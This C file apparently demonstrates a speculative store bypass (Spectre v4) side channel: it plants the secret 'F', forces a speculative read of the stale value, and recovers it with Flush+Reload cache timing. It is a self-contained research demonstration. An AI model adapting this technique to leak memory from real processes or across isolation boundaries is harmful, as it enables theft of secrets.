

#include <stdint.h>
#include <x86intrin.h>
#include <stdio.h>
#include <string.h>

#define SECRET "F"
char *probe_buf;
size_t pagesize = 4096;
int junk = 0;

void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }

// ---------------------------------------------------------------------------
void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

int flush_reload_t(void *ptr) {
  register uint64_t start = 0, end = 0;
  start = __rdtscp(&junk);
  maccess(ptr);

  end = __rdtscp(&junk);
  flush(ptr);

  return (int)(end - start);
}

void accessSTL(int x, char* data){
  // store secret in data
  strcpy(data, SECRET);
  

  // flushing the data which is used in the condition increases
  // probability of speculation
  _mm_mfence();
  char** data_slowptr = &data;
  char*** data_slowslowptr = &data_slowptr;
  char**** data_ultraslowptr = &data_slowslowptr;
  _mm_mfence();
  flush(&x);
  flush(data_slowptr);
  flush(&data_slowptr);
  flush(data_slowslowptr);
  flush(&data_slowslowptr);
  flush(data_ultraslowptr);
  flush(&data_ultraslowptr);
  // ensure data is flushed at this point
  _mm_mfence();
  //_mm_sfence();

  // overwrite data via different pointer
  // pointer chasing makes this extremely slow
  (*(*(*data_ultraslowptr)))[x] = '#';

  // data[x] should now be "#"
  // uncomment next line to break attack
  //nospec();
  // Encode stale value in the cache
    maccess(probe_buf + data[x]*pagesize);
}


int main(){
    int j,k;
    int i = 0;
    probe_buf = malloc(256 * pagesize);
    int hits[256];

    char* target = malloc(2);
    int mix_i;

    for (i = 0; i < 256; i++) {
        hits[i] = 0;
    }

    
    for (int tries = 19; tries > 0; tries--){
        _mm_mfence();

        for (i = 0; i < 256; i++){
            _mm_clflush(probe_buf + i*pagesize);
        }
        _mm_mfence();


        accessSTL(0, target);
        _mm_mfence();
        
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            if (flush_reload_t(probe_buf + mix_i * pagesize) <= 80){
                hits[mix_i]++;
            }
        }
    }

    // locate top two results
    j = k = -1;
    for (i = 0; i < 256; i++) {
        if (j < 0 || hits[i] >= hits[j]) {
            k = j;
            j = i;
        } else if (k < 0 || hits[i] >= hits[k]) {
            k = i;
        }
    }
    /* if ((hits[j] >= 2 * hits[k] + 5) ||
        (hits[j] == 2 && hits[k] == 0)) {
        break;
    } */

    printf("%d\n",junk);
    printf("j,hits[j]: %c,%d\n",j,hits[j]);
    free(probe_buf);
    free(target);
}